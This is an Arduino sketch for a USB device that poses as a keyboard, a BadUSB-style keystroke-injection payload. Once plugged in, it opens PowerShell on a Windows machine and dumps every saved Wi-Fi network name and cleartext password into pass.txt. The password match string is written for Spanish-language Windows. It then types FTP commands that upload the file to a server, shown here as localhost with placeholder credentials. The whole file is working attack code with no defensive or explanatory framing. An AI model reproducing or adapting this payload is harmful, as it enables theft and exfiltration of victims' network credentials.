#include <Keyboard.h>
void setup() {
Keyboard.begin();
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(100);
//Keyboard.print("powershell Start-Process powershell -Verb runAs");
Keyboard.print("powershell Start-Process powershell");
typeKey(KEY_RETURN);
delay(1000);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(121);
Keyboard.releaseAll();
delay(500);
Keyboard.print("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)} | Select-String \"Contenido de la clave\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >> pass.txt");
typeKey(KEY_RETURN);
delay(500);
Keyboard.print("ftp");
typeKey(KEY_RETURN);
delay(100);
Keyboard.print("open localhost");
typeKey(KEY_RETURN);
delay(100);
Keyboard.print("usuario");
typeKey(KEY_RETURN);
delay(100);
Keyboard.print("password");
typeKey(KEY_RETURN);
delay(100);
Keyboard.print("put pass.txt");
typeKey(KEY_RETURN);
delay(2000);
Keyboard.print("disconnect");
typeKey(KEY_RETURN);
delay(100);
Keyboard.print("quit");
typeKey(KEY_RETURN);
delay(100);
Keyboard.print("exit");
typeKey(KEY_RETURN);
Keyboard.end();
}
void typeKey(int key){
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}
void loop() {}
